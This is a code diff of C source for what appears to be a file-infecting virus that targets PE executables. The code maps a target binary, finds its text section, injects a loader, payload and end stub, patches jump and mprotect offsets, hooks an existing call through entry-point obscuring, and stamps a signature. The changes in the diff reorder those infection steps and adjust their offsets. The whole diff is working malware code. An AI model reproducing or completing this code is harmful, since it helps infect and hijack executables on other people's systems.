@@ -7,15 +7,6 @@ static void	init_info(t_info *info)
 	info->valid_target = 1;
 }
 
-static void	hook_call(t_info *info)
-{
-	int32_t	new_jmp;
-
-	new_jmp = (int32_t)(info->text_size - (size_t)((size_t)(info->addr_call_to_replace) - (size_t)(info->text_begin)) - 5);
-	ft_memcpy(info->addr_call_to_replace + 1, &new_jmp, sizeof(new_jmp));
-}
-
-
 static void	patch_loader(t_info *info)
 {
 	int32_t	start;
@@ -34,7 +25,7 @@ static void	patch_loader(t_info *info)
 	end = info->addr_payload;
 	val = end - start;
 	// rewrite addr for mprotect
-	ft_memcpy(info->text_begin + info->text_size + 44, &val, 4);
+	ft_memcpy(info->text_begin + info->text_size + 52, &val, 4);
 }
 
 static void	inject_loader(t_info *info)
@@ -42,7 +33,6 @@ static void	inject_loader(t_info *info)
 	void		*addr;
 
 	addr = &loader;
-	hook_call(info);
 	ft_memcpy(info->text_begin + info->text_size, addr, LOADER_SIZE);
 	patch_loader(info);
 }
@@ -77,16 +67,21 @@ static void	inject_payload(t_info *info)
 	patch_payload(info);
 }
 
-static void	patch_end(t_info *info)
+void	patch_end(t_info *info, int32_t nb)
 {
 	int32_t	start;
 	int32_t	end;
 	int32_t	val;
 
 	start = info->text_addr + info->text_size + LOADER_SIZE + END_SIZE;
+	if (nb == 1)
+		start -= 5;
 	end = (int32_t)((size_t)(info->addr_hooked_func) - (size_t)(info->text_begin) + info->text_addr);
 	val = end - start;
-	ft_memcpy(info->text_begin + info->text_size + LOADER_SIZE + END_SIZE - 4, &val, 4);
+	if (nb == 1)
+		ft_memcpy(info->text_begin + info->text_size + LOADER_SIZE + END_SIZE - 9, &val, 4);
+	if (nb == 2)
+		ft_memcpy(info->text_begin + info->text_size + LOADER_SIZE + END_SIZE - 4, &val, 4);
 }
 
 static void	inject_end(t_info *info)
@@ -95,7 +90,6 @@ static void	inject_end(t_info *info)
 
 	addr = &ft_end;
 	ft_memcpy(info->text_begin + info->text_size + LOADER_SIZE, addr, END_SIZE);
-	patch_end(info);
 }
 
 static void	patch_addresses(t_info *info)
@@ -109,6 +103,10 @@ static void	patch_addresses(t_info *info)
 	end = (int32_t)((size_t)(info->text_begin) + (size_t)(info->text_size) - (size_t)(info->file));
 	val = end - start;
 	ft_memcpy(info->file + info->offset_payload + OFFSET_1, &val, 4);
+
+	start = info->addr_payload + OFFSET_4 + 4;
+	val = end - start;
+	ft_memcpy(info->file + info->offset_payload + OFFSET_4, &val, 4);
 
 	// &ft_memcpy
 	start = info->addr_payload + OFFSET_2 + 4;
@@ -169,28 +167,33 @@ int		main()
 	struct stat		st;
 	int			fd;
 	t_info			info;
+	void			*addr;
 
+	addr = &loader + LOADER_SIZE - 4;
 	write_filename_src(buf);
 	if ((fd = ft_sysopen(buf, O_RDWR)) ==  -1)
-		return (1);
+		handle_exit(addr);
 	init_info(&info);
 	ft_sysfstat(fd, &st);
 	info.file_size = st.st_size;
 	if ((info.file = ft_sysmmap(0, st.st_size, PROT_READ | PROT_WRITE, MAP_PRIVATE, fd, 0)) == MAP_FAILED)
-		return (1);
+		handle_exit(addr);
 	pe_parsing(&info);
 	if (reload_mapping(&info) == 1)
-		return (1);
+		handle_exit(addr);
 	if (find_text(&info) == 1)
-		return (1);
-	epo_parsing(&info);
-	if (info.valid_target == 0)
-		return (1);
+		handle_exit(addr);
+
 	inject_loader(&info);
 	inject_payload(&info);
 	inject_end(&info);
+	epo_parsing(&info);
+	if (info.valid_target == 0)
+		handle_exit(addr);
+
 	patch_addresses(&info);
 	inject_sign(&info);
+
 	ft_sysclose(fd);
 	write_filename_src(buf);
 	ft_syswrite(1, buf, 9);
